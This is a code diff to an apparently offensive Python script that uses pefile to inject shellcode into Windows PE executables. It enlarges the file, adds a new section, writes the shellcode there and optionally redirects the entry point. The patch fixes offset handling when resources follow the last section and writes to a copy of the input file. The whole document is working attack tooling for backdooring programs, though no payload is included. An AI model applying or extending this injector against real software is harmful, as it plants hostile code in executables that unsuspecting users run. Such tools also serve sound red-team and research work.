@@ -48,6 +48,7 @@ import mmap
 import os
 import argparse
 import binascii
+from shutil import copyfile
 
 def auto_int(x):
     return int(x, 0)
@@ -74,20 +75,21 @@ def align(val_to_align, alignment):
     return int((val_to_align + alignment - 1) / alignment) * alignment
 
 
-def resize(exe_path, shellcode):
+def resize(exe_path, shellcode, original_size):
     pe = pefile.PE(exe_path)
     file_alignment = pe.OPTIONAL_HEADER.FileAlignment
     shellcode_size = len(shellcode)
-    original_size = os.path.getsize(exe_path)
     print( "\t[+] Original Size = %d" % original_size )
     fd = open(exe_path, 'a+b')
     map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
 
     size_increment = align(shellcode_size, file_alignment) + 0x1000
-    map.resize(original_size + size_increment)
+    new_size = original_size + size_increment
+    map.resize(new_size)
     #DBG: map.resize(original_size + 0x50000)
     map.close()
     fd.close()
+    return new_size
 
 
 def resize_mem(exe_buffer, shellcode):
@@ -101,7 +103,7 @@ def resize_mem(exe_buffer, shellcode):
     return exe_buffer
 
 
-def inject(pe, shellcode, offset, no_ep, output):
+def inject(pe, shellcode, offset, no_ep, output, raw_inject_addr):
     shellcode_size = len(shellcode)
     file_alignment = pe.OPTIONAL_HEADER.FileAlignment
     section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
@@ -112,15 +114,17 @@ def inject(pe, shellcode, offset, no_ep, output):
     if number_of_section != 0:
         last_section = number_of_section - 1
 
-        new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)
+        new_section_offset = (pe.sections[last_section].get_file_offset() + 40)
 
         # Look for valid values for the new section header
 
         #DBG: raw_size = align(0x40000, file_alignment)
         #DBG: virtual_size = align(0x40000, section_alignment)
-        raw_offset = align((pe.sections[last_section].PointerToRawData +
-                            pe.sections[last_section].SizeOfRawData),
-                           file_alignment)
+        # raw_offset = align((pe.sections[last_section].PointerToRawData +
+        #                     pe.sections[last_section].SizeOfRawData),
+        #                   file_alignment)
+        # FIX: Resources etc. can be present after last section
+        raw_offset = raw_inject_addr
 
         virtual_offset = align((pe.sections[last_section].VirtualAddress +
                                 pe.sections[last_section].Misc_VirtualSize),
@@ -138,6 +142,7 @@ def inject(pe, shellcode, offset, no_ep, output):
 
     # Create the section
     # Set the name
+    print( "\t[+] Section Offset = %s" % hex(new_section_offset) )
     pe.set_bytes_at_offset(new_section_offset, name)
     print( "\t[+] Section Name = %s" % name )
     # Set the virtual size
@@ -166,6 +171,7 @@ def inject(pe, shellcode, offset, no_ep, output):
     print( "\t[+] Size of Image = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage )
 
     pe.write(output)
+    pe = pefile.PE(output)
 
     if not no_ep:
         pe = pefile.PE(output)
@@ -179,8 +185,8 @@ def inject(pe, shellcode, offset, no_ep, output):
 
     # STEP 0x04 - Inject the Shellcode in the New Section
     print( "[*] STEP 0x04 - Inject the Shellcode in the New Section" )
+    print( "\t[+] Offset = %s bytes" % hex(raw_offset) )
 
-    raw_offset = pe.sections[last_section].PointerToRawData
     pe.set_bytes_at_offset(raw_offset, shellcode)
     print( "\t[+] Shellcode wrote in the new section" )
 
@@ -191,14 +197,17 @@ def inject_file(exe_path, shellcode, offset, no_ep, output):
     # STEP 0x01 - Resize the Executable
     # Note: I added some more space to avoid error
     print( "[*] STEP 0x01 - Resize the Executable" )
-    resize(exe_path, shellcode)
-    print( "\t[+] New Size = %d bytes\n" % os.path.getsize(exe_path) )
+    copyfile(exe_path, output)
+
+    old_size = os.path.getsize(output)
+    new_size = resize(output, shellcode, old_size)
+    print( "\t[+] New Size = %d bytes\n" % new_size )
 
     # STEP 0x02 - Add the New Section Header
     print( "[*] STEP 0x02 - Add the New Section Header" )
-    pe = pefile.PE(exe_path)
+    pe = pefile.PE(output)
 
-    inject(pe, shellcode, offset, no_ep, output)
+    inject(pe, shellcode, offset, no_ep, output, old_size)
 
 def shellcode2exe(shellcode, offset, output):
     print( "[*] STEP 0x01 - Prepare the Executable" )
@@ -214,7 +223,7 @@ def shellcode2exe(shellcode, offset, output):
     print( "[*] STEP 0x02 - Add the New Section Header" )
     pe = pefile.PE(data=x)
 
-    inject(pe, shellcode, offset, False, output)
+    inject(pe, shellcode, offset, False, output, len(dummy_pe))
 
 
 def read_shellcode_file(shellcode_path):
